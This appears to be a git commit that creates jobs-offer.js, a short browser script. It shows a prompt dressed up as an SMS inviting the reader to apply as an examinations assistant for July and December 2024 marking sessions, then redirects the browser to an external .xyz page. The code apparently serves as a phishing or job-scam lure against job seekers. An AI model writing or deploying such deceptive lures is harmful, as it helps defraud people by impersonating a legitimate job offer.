620998a3762f33e41562819a8cd0fdb42facb4e4
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-07-10 22:55:56 -0700

    Create jobs-offer.js

---
+++ jobs-offer.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: You are invited to apply as examinations assistant for July and December 2024 marking sessions. kindly press 1 to start application now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/gauteng.job.html';
+}
